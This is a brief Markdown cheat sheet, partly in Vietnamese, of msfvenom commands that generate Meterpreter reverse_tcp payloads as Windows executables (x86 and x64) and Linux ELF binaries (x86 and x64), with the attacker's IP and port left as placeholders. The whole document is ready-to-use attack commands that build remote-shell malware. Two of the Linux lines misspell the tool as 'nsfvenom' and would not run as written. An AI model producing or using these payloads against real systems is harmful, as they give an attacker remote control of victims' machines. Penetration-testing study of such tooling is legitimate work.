# Generating Payloads with Msfvenom

`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<ip của mình> LPORT=<port> -f exe > /path to lưu file`

đối với x64 

`msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<ip của mình> LPORT=<port> -f exe > /path to lưu file`

đối với linux x86

`nsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > path to lưu file`

với linux x64

`nsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > path to lưu file`


















